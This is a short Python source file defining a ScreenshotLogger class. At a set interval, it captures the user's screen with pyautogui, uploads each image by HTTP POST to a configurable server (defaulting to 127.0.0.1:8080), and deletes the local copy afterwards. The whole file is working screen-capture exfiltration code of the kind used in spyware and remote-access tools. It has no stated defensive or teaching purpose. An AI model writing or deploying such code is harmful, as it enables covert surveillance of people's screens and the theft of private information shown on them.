import pyautogui
import threading
import requests
import os
from datetime import datetime

class ScreenshotLogger:
    def __init__(self, interval = 60, server_ip="127.0.0.1", port=8080):
        self.interval = interval
        self.server_ip = server_ip
        self.port = port
 
    def _generate_name(self):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return f"screenshot{timestamp}.png"

    def take_screenshot(self):
        print("[*] Taking Screenshot...")
        filename = self._generate_name()
        pyautogui.screenshot().save(filename)
        print(f"[+] Saved Screenshot as file name {filename}")
        return filename
    
    def send_screenshot(self, image_path):
        try:
            with open(image_path, 'rb') as img:
                files = {'screenshot':img}
                response = requests.post(f"http://{self.server_ip}:{self.port}/upload", files=files)
                print(f"[Upload Success] {response.text}")

        except Exception as e:
            print(f"[Upload Failed] {e}")
        
        finally:
            os.remove(image_path)

    def start(self):
        def loop():
            img = self.take_screenshot()
            self.send_screenshot(img)
            threading.Timer(self.interval, loop).start()

        loop()